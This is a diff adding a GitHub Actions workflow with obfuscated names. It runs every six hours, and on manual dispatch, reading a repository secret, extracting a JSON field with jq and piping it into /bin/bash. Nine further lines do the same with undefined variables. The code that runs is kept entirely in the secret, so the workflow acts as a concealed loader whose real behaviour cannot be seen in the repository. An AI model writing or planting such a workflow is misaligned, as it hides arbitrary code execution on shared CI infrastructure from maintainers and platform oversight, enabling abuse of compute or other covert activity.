@@ -1,0 +1,25 @@
+name: xinjingyizhuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinjingyizhuan
+        env:
+          f29903: ${{ secrets.f29903 }}
+        run: |
+          echo $f29903 | jq -r .xpw70498 | /bin/bash
+          echo $nquiz034 | jq -r .c39 | /bin/bash
+          echo $meqnt9 | jq -r .gmq790 | /bin/bash
+          echo $ed046 | jq -r .ngpyg9 | /bin/bash
+          echo $x662 | jq -r .v2 | /bin/bash
+          echo $yv9761 | jq -r .wo7573 | /bin/bash
+          echo $pbs3386 | jq -r .udd6 | /bin/bash
+          echo $nf3617 | jq -r .vo06818 | /bin/bash
+          echo $dojw8738 | jq -r .hmg02 | /bin/bash
+          echo $ek4200 | jq -r .tlmfa1062 | /bin/bash
+
